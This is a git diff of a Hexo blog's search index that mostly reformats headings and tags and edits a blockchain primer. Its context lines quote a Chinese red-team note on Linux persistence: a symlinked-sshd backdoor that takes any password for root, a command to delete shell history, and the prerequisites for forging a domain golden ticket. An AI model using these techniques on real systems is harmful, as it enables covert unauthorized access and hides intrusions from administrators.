-<p>####7.2.Linux权限维持</p>
-<ul>
+<h4 id="7-2-Linux权限维持"><a href="#7-2-Linux权限维持" class="headerlink" title="7.2.Linux权限维持"></a>7.2.Linux权限维持</h4><ul>
 <li><p>软链接sshd：<code>ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oport=12345</code></p>
 <ol>
 <li><code>ssh root@IP -p 12345</code>输入任何密码就可以root登录</li>
@@ -1789,8 +1784,7 @@ net localgroup administrators temp /add
 <li><p>删除命令历史：<code>sed -i 100,$d,bash_history</code>删除100行之后的命令；指定行<code>history -d 100</code></p>
 </li>
 </ul>
-<p>####7.3.域内权限维持</p>
-<ul>
+<h4 id="7-3-域内权限维持"><a href="#7-3-域内权限维持" class="headerlink" title="7.3.域内权限维持"></a>7.3.域内权限维持</h4><ul>
 <li>黄金票据伪造（PTT）</li>
 </ul>
 <p>条件：域名称+域SID+域的KRBTGT的账号密码的hash+伪造用户</p>
@@ -1866,20 +1860,22 @@ net localgroup administrators temp /add
         <category>渗透</category>
       </categories>
       <tags>
-        <tag>-- 渗透 -- CTF -- Web -- 红队</tag>
+        <tag>CTF</tag>
+        <tag>渗透</tag>
+        <tag>Web</tag>
+        <tag>红队</tag>
       </tags>
   </entry>
   <entry>
     <title>区块链介绍</title>
     <url>/2023/08/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%BB%8B%E7%BB%8D/</url>
-    <content><![CDATA[<p>区块链的去中心化特性非常引人，而这篇文章将会对密码学应用中的区块链技术做一些入门讲解</p>
-<p>密码学应用中的区块链技术的去中心化非常引人，而这篇文章将会对其做一些入门讲解</p>
+    <content><![CDATA[<p>密码学应用中的区块链技术的去中心化非常引人，而这篇文章将会对其做一些入门讲解</p>
 <span id="more"></span>
 
 <h1 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h1><blockquote>
-<p>区块链就是一个全网不断增加的大账本，每一个节点都有完整的区块链。该账本由区块（记录交易）和链（区块中的一个哈希值，用来指向上一个区块）组成的有序链表。伪造区块链至少需要全网51%的算力，因为每个区块本身的区块哈希需要上一个区块的哈希计算，区块越多越难更改。区块链1.0—比特币，2.0—以太坊。</p>
+<p>区块链就是一个全网不断增加的大账本，每一个节点都有完整的区块链。该账本由区块（记录交易）和链（区块中的一个哈希值，用来指向上一个区块）组成的有序链表。伪造区块链至少需要全网51%的算力，因为每个区块本身的区块哈希需要上一个区块的哈希计算，区块越多越难更改。我们以比特币为区块链1.0进行介绍，将以太坊作为区块链2.0作为引入</p>
 </blockquote>
-<h3 id="1-比特币（第一种数字货币）"><a href="#1-比特币（第一种数字货币）" class="headerlink" title="1.比特币（第一种数字货币）"></a>1.比特币（第一种数字货币）</h3><p>用到的分布式数据存储、点对点传输、共识机制、加密算法，统称为区块链技术</p>
+<h3 id="1-比特币"><a href="#1-比特币" class="headerlink" title="1.比特币"></a>1.比特币</h3><p>用到的分布式数据存储、点对点传输、共识机制、加密算法，统称为区块链技术</p>
 <p>比特币使用区块链技术实现了数字货币的可信支付，本质就是个账本系统，由中本聪最先发行，通过P2P网络（peer to peer）进行发行流通，又称为“点对点的电子现金系统”。其有价值的原因是全球都具有该共同的账本，价值为大家共同的信任。由hash对交易双方的信息进行加密处理</p>
 <p>特点：1.高度自治，无需中心。2.无国界贸易。 3.不可篡改，且能防伪造，数量一定。4.隐私安全</p>
 <ul>
@@ -1915,7 +1911,8 @@ net localgroup administrators temp /add
         <category>其他计算机技术</category>
       </categories>
       <tags>
-        <tag>-- 密码学 -- 区块链</tag>
+        <tag>密码学</tag>
+        <tag>区块链</tag>
       </tags>
   </entry>
 </search>
